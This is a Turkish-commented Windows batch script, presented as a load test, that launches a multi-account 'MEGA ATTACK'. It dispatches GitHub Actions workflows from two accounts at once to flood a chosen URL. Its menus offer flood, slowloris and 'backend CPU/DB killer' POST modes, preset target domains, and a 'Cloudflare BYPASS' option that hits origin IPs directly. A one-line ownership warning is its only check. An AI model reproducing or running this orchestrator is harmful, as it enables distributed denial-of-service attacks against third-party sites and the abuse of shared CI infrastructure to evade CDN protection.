@echo off
REM ================================================================
REM  💥 DISTRIBUTED LOAD TEST — MEGA MULTI-ACCOUNT ORCHESTRATOR
REM
REM  İki hesabı EŞ ZAMANLI tetikler:
REM    → Forest123456789 (20 bot)
REM    → Stranic000      (20 bot)
REM    = 40 paralel bot, ~260K req/s teorik
REM
REM  Menü akışı:
REM    1. Hedef seçimi
REM    2. Attack mode
REM    3. Yoğunluk
REM    4. Hesap sayısı seçimi (1 veya 2 hesap)
REM    5. Onay + eş zamanlı trigger
REM ================================================================
setlocal enabledelayedexpansion
chcp 65001 >nul

REM ---- Secrets yükle ----
if exist "config\secrets.bat" (
    call config\secrets.bat
) else if exist "config\secrets.env" (
    call config\secrets.env
) else (
    echo HATA: config\secrets.bat bulunamadi!
    pause
    exit /b 1
)

REM ---- Hesap 2 workflow ID kontrolü ----
set "GH2_READY=1"
if "%GH2_WORKFLOW_ID%"=="" (
    set "GH2_READY=0"
)

echo.
echo ╔══════════════════════════════════════════════════════╗
echo ║   💥 MEGA ATTACK — MULTI-ACCOUNT ORCHESTRATOR        ║
echo ║                                                      ║
echo ║   Hesap 1: %GH1_USER%                       ║
if "!GH2_READY!"=="1" (
    echo ║   Hesap 2: %GH2_USER%   [READY]                     ║
) else (
    echo ║   Hesap 2: %GH2_USER%   [NOT SETUP - setup calistir]║
)
echo ╚══════════════════════════════════════════════════════╝
echo.

REM ================ MENU 1: HEDEF ================
echo   [1/5] HEDEF SECIMI
echo.
echo     [1] https://hhh.frostai.com.tr
echo     [2] https://frostai.xyz
echo     [3] https://frostai.com.tr
echo     [4] Manuel URL
echo     [5] 🎯 IP + Port + Host header (Cloudflare BYPASS)
echo.
set /p SECIM="Hedef mod (1-5): "

set "HOST_HEADER="
set "TARGET_URL="

if "%SECIM%"=="1" set "TARGET_URL=https://hhh.frostai.com.tr"
if "%SECIM%"=="2" set "TARGET_URL=https://frostai.xyz"
if "%SECIM%"=="3" set "TARGET_URL=https://frostai.com.tr"
if "%SECIM%"=="4" set /p TARGET_URL="Hedef URL: "
if "%SECIM%"=="5" (
    echo.
    echo   [1] HTTP  [2] HTTPS
    set /p PROTO="Protokol (1-2): "
    if "!PROTO!"=="1" ( set "SCHEME=http" & set "DEFAULT_PORT=80" )
    if "!PROTO!"=="2" ( set "SCHEME=https" & set "DEFAULT_PORT=443" )
    set /p ORIGIN_IP="Origin IP: "
    set /p PORT="Port [!DEFAULT_PORT!]: "
    if "!PORT!"=="" set "PORT=!DEFAULT_PORT!"
    set /p HOST_HEADER="Host header (opsiyonel): "
    if "!PORT!"=="!DEFAULT_PORT!" (
        set "TARGET_URL=!SCHEME!://!ORIGIN_IP!"
    ) else (
        set "TARGET_URL=!SCHEME!://!ORIGIN_IP!:!PORT!"
    )
)

if "!TARGET_URL!"=="" ( echo Gecersiz secim! & pause & exit /b 1 )

echo   ✅ Hedef: !TARGET_URL!
if not "!HOST_HEADER!"=="" echo   ✅ Host  : !HOST_HEADER!

REM ================ MENU 2: ATTACK MODE ================
echo.
echo   [2/5] ATTACK MODE
echo.
echo     [1] 🔥 FLOOD     (multi-endpoint cache-bypass)
echo     [2] 🐢 SLOWLORIS (connection pool exhaustion)
echo     [3] 💣 POST      (backend CPU/DB killer)
echo     [4] 🧠 ADAPTIVE  (response-aware)
echo     [5] 📜 LEGACY
echo.
set /p MODE_CHOICE="Mode (1-5) [1]: "
if "%MODE_CHOICE%"=="" set "MODE_CHOICE=1"
if "%MODE_CHOICE%"=="1" set "ATTACK_MODE=flood"
if "%MODE_CHOICE%"=="2" set "ATTACK_MODE=slowloris"
if "%MODE_CHOICE%"=="3" set "ATTACK_MODE=post"
if "%MODE_CHOICE%"=="4" set "ATTACK_MODE=adaptive"
if "%MODE_CHOICE%"=="5" set "ATTACK_MODE=legacy"
if "!ATTACK_MODE!"=="" ( echo Gecersiz mode! & pause & exit /b 1 )
echo   ✅ Mode: !ATTACK_MODE!

REM ================ MENU 3: YOGUNLUK ================
echo.
echo   [3/5] YOGUNLUK
echo.
if "!ATTACK_MODE!"=="slowloris" (
    echo     [1] Hafif   - 3m  / 1000 VU / 5 bot
    echo     [2] Orta    - 5m  / 3000 VU / 20 bot  ^(standart^)
    echo     [3] Agresif - 10m / 5000 VU / 20 bot
    echo     [4] Max     - 20m / 8000 VU / 20 bot
    echo     [5] Manuel
) else (
    echo     [1] Hafif   - 60s  / 100 VU / 5 bot
    echo     [2] Orta    - 120s / 300 VU / 20 bot  ^(standart^)
    echo     [3] Agresif - 5m   / 500 VU / 20 bot
    echo     [4] Full    - 20m  / 500 VU / 20 bot
    echo     [5] Manuel
)
echo.
set /p YOGUNLUK="Yogunluk (1-5): "

if "!ATTACK_MODE!"=="slowloris" (
    if "%YOGUNLUK%"=="1" ( set "DURATION=3m"  & set "VUS=1000" & set "JOBS=5"  & set "RPS=0" )
    if "%YOGUNLUK%"=="2" ( set "DURATION=5m"  & set "VUS=3000" & set "JOBS=20" & set "RPS=0" )
    if "%YOGUNLUK%"=="3" ( set "DURATION=10m" & set "VUS=5000" & set "JOBS=20" & set "RPS=0" )
    if "%YOGUNLUK%"=="4" ( set "DURATION=20m" & set "VUS=8000" & set "JOBS=20" & set "RPS=0" )
) else (
    if "%YOGUNLUK%"=="1" ( set "DURATION=60s"  & set "VUS=100" & set "JOBS=5"  & set "RPS=0" )
    if "%YOGUNLUK%"=="2" ( set "DURATION=120s" & set "VUS=300" & set "JOBS=20" & set "RPS=0" )
    if "%YOGUNLUK%"=="3" ( set "DURATION=5m"   & set "VUS=500" & set "JOBS=20" & set "RPS=0" )
    if "%YOGUNLUK%"=="4" ( set "DURATION=20m"  & set "VUS=500" & set "JOBS=20" & set "RPS=0" )
)

if "%YOGUNLUK%"=="5" (
    set /p DURATION="Sure: "
    set /p VUS="VU per bot: "
    set /p JOBS="Paralel bot (1-20): "
    set /p RPS="RPS limit (0=max): "
)

if "!DURATION!"=="" ( echo Gecersiz yogunluk! & pause & exit /b 1 )

REM ================ MENU 4: HESAP SAYISI ================
echo.
echo   [4/5] HESAP SAYISI
echo.
echo     [1] Sadece Hesap 1 (Forest123456789)      → !JOBS! bot
if "!GH2_READY!"=="1" (
    set /a "TOTAL_BOTS=!JOBS! * 2"
    echo     [2] Iki hesap paralel                     → !TOTAL_BOTS! bot ^(MEGA^)
) else (
    echo     [2] Iki hesap paralel                     → NOT READY (setup-second-account.bat calistir)
)
echo.
set /p HESAP_SEC="Hesap sec (1-2) [2]: "
if "%HESAP_SEC%"=="" set "HESAP_SEC=2"

set "USE_TWO_ACCOUNTS=0"
if "%HESAP_SEC%"=="2" (
    if "!GH2_READY!"=="1" (
        set "USE_TWO_ACCOUNTS=1"
    ) else (
        echo   ⚠️  Hesap 2 hazir degil, tek hesap kullanilacak.
        echo   Setup icin: setup-second-account.bat
        set "USE_TWO_ACCOUNTS=0"
    )
)

REM ================ MENU 5: ONAY ================
echo.
echo ╔══════════════════════════════════════════════════════╗
echo ║   [5/5] MEGA ATTACK ONAYI                            ║
echo ╚══════════════════════════════════════════════════════╝
echo   Hedef       : !TARGET_URL!
if not "!HOST_HEADER!"=="" echo   Host        : !HOST_HEADER!
echo   Attack mode : !ATTACK_MODE!
echo   Sure        : !DURATION!
echo   VU per bot  : !VUS!
echo   Bot / hesap : !JOBS!
if "!USE_TWO_ACCOUNTS!"=="1" (
    set /a "TOTAL_BOTS=!JOBS! * 2"
    echo   Toplam bot  : !TOTAL_BOTS! (2 hesap paralel)
    echo   Hesaplar    : %GH1_USER% + %GH2_USER%
) else (
    echo   Toplam bot  : !JOBS! (tek hesap)
    echo   Hesap       : %GH1_USER%
)
echo   RPS limit   : !RPS!
echo ══════════════════════════════════════════════════════
echo.
echo   ⚠️  Bu URL/IP SIZE MI AIT? Baskasinin sistemi = SUC!
echo.
set /p ONAY="Onayliyor musunuz? (EVET yazin): "
if /i not "!ONAY!"=="EVET" (
    echo   Iptal edildi.
    pause
    exit /b
)

echo.
echo   🚀 MEGA TRIGGER baslatiliyor...

REM ---- Payload olustur ----
set "PAYLOAD={\"ref\":\"main\",\"inputs\":{\"target_url\":\"!TARGET_URL!\",\"duration\":\"!DURATION!\",\"vus_per_runner\":\"!VUS!\",\"rps_per_runner\":\"!RPS!\",\"parallel_jobs\":\"!JOBS!\",\"host_header\":\"!HOST_HEADER!\",\"attack_mode\":\"!ATTACK_MODE!\"}}"

REM ---- Hesap 1 trigger ----
echo.
echo   [Hesap 1] %GH1_USER% tetikleniyor...
curl -sS -X POST ^
  -H "Authorization: token %GH1_TOKEN%" ^
  -H "Accept: application/vnd.github+json" ^
  "https://api.github.com/repos/%GH1_USER%/%GH1_REPO%/actions/workflows/%GH1_WORKFLOW_ID%/dispatches" ^
  -d "!PAYLOAD!" -o nul -w "     HTTP: %%{http_code}\n"

REM ---- Hesap 2 trigger (varsa) ----
if "!USE_TWO_ACCOUNTS!"=="1" (
    echo.
    echo   [Hesap 2] %GH2_USER% tetikleniyor...
    curl -sS -X POST ^
      -H "Authorization: token %GH2_TOKEN%" ^
      -H "Accept: application/vnd.github+json" ^
      "https://api.github.com/repos/%GH2_USER%/%GH2_REPO%/actions/workflows/%GH2_WORKFLOW_ID%/dispatches" ^
      -d "!PAYLOAD!" -o nul -w "     HTTP: %%{http_code}\n"
)

echo.
echo   ✅ MEGA TRIGGER tamamlandi.
echo   Workflow'lar ~10 saniye icinde baslar.
echo.
echo   📊 Multi-account monitor aciliyor...
timeout /t 3 /nobreak >nul

if "!USE_TWO_ACCOUNTS!"=="1" (
    powershell -ExecutionPolicy Bypass -NoProfile -File "%~dp0monitor-multi.ps1"
) else (
    powershell -ExecutionPolicy Bypass -NoProfile -File "%~dp0monitor.ps1"
)

echo.
echo   Sonuclar:
echo     https://github.com/%GH1_USER%/%GH1_REPO%/actions
if "!USE_TWO_ACCOUNTS!"=="1" (
    echo     https://github.com/%GH2_USER%/%GH2_REPO%/actions
)
pause